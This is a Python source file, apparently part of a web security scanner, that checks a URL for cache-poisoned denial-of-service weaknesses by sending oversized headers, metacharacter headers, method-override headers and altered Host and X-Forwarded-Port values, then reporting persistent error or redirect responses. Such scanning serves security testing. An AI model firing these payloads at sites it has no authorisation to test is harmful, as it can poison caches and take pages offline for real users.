#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback

def HHO(url, s, main_status_code):
    #HTTP Header Oversize 

    cpdos_win = False
    max_i = 20
    i = 0
    while i < max_i:
        h = {"X-Oversized-Header-{}".format(i):"Big-Value-00000000000000000000000000000000000000000000000000000000000000000000"}
        try:
            req_hho = s.get(url, headers=h)
            if req_hho.status_code in [400, 500] and req_hho.status_code != main_status_code:
                print(h)
                print(url)
                print(req_hho.status_code)
                #print(req_hho.headers)
                i = 20
                cpdos_win = True
            i += 1
        except KeyboardInterrupt:
            pass
        except:
            print("plop")
    if cpdos_win:
        print("   └── \033[31m{} CPDos HHO seem work !\033[0m".format(url))


def HMC(url, s, main_status_code):
    chars = [r"\n", r"\a", r"\r"]
    for c in chars:
        headers = {"X-Metachar-Header": c}
        req_hmc = s.get(url, headers=headers, timeout=10, verify=False)
        if req_hmc.status_code in [400, 500]:
            req_verify_hmc = s.get(url, verify=False, timeout=10)
            if req_verify_hmc.status_code == req_hmc.status_code:
                print("   └── \033[31m CPDos HMC on {} seem work with {} payload header ! \033[0m".format(url, headers))



def HMO(url, s, main_status_code):
    methods = ["POST", "PUT", "HELP", "DELETE"]
    for m in methods:
        headers = {"X-HTTP-Method-Override": m}
        req_hmo = s.get(url, headers=headers, verify=False, timeout=10)
        if req_hmo.status_code in [404, 405] and req_hmo.status_code != main_status_code:
            req_verify_hmo = s.get(url, verify=False, timeout=10)
            if req_verify_hmo.status_code == req_hmo.status_code:
                print("   └── \033[31m CPDos HMO on {} seem work with {} payload header ! \033[0m".format(url, headers))


def check_CPDoS(url, s, req_main, domain):
    i = 0
    redirect_req = False

    if req_main.status_code in [301, 302]:
        url = req_main.headers['location'] if "http" in req_main.headers['location'] else "{}{}".format(url, req_main.headers['location'])
    print("\033[36m ├ CPDoS analyse\033[0m")
    url = "{}?CPDoS=1".format(url)
    try:
        req_main = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    except:
        pass
    main_status_code = req_main.status_code
    print("\033[36m --├ {} [{}] \033[0m".format(url, main_status_code))
    headers = [{"Host":"{}:1234".format(domain)}, {"X-Forwarded-Port":"123"}]
    for h in headers:
        try:
            req_cpdos = s.get(url, headers=h, verify=False, allow_redirects=False, timeout=10)
            if req_cpdos.status_code in [301, 302, 303, 421, 502]:
                print(" \033[36m├\033[0m {} + [\033[33m{}\033[0m] → \033[33m{}\033[0m".format(url, h, req_cpdos.status_code))
                #print(" └── CPDos exploit seem to be possible, next test...")
                redirect_req = True
                if "Location" in req_cpdos.headers:
                    for rch in req_cpdos.headers:
                        if rch == "Location":
                            print(" └── Location:  {}".format(req_cpdos.headers[rch]))
                            #return True
                if redirect_req:
                    print(" --\033[36m├ Check if {} timeout...\033[0m".format(url)) 
                    url_timeout = False
                    n_timout = 0
                    while i != 15:
                        i += 1
                        try:
                            req_cpdos = s.get(url, verify=False, allow_redirects=False, timeout=6)
                            response_time = req_cpdos.elapsed.total_seconds()
                            if response_time > 1.5:
                                n_timout += 1
                        except requests.exceptions.Timeout:
                            print("   └── \033[31m{} Seem to timout, CPDos exploit seem to be possible !\033[0m".format(url))
                            url_timeout = True
                    if n_timout > 1:
                        print("   └── \033[33m{} Answered {}/15 at more than 1,5scd, CPDos exploit seem to be possible !\033[0m".format(url, n_timout))
                        url_timeout = True
                    if not url_timeout:
                        print("   └── Not seem timeout, you can check manually if the exploit is possible")
                else:
                    try:
                        req_cpdos_other_verification = s.get(url, verify=False, allow_redirects=False, timeout=10)
                        if req_cpdos_other_verification.status_code != req_main.status_code:
                            print("   └── Not seem timeout but the page return {} status code with these informations:\n   -URL:{}\n   -HEADER{}, check it manually on {} if this page is down".format(req_cpdos_other_verification.status_code, url, h, url))
                    except:
                        pass
        except requests.exceptions.Timeout:
            print(" └── \033[31m{} Seem to timout, CPDos exploit seem to be possible with {} header\033[0m".format(url, h))
            return True
        except:
            pass
    HHO(url, s, main_status_code)
    HMC(url, s, main_status_code)
    HMO(url, s, main_status_code)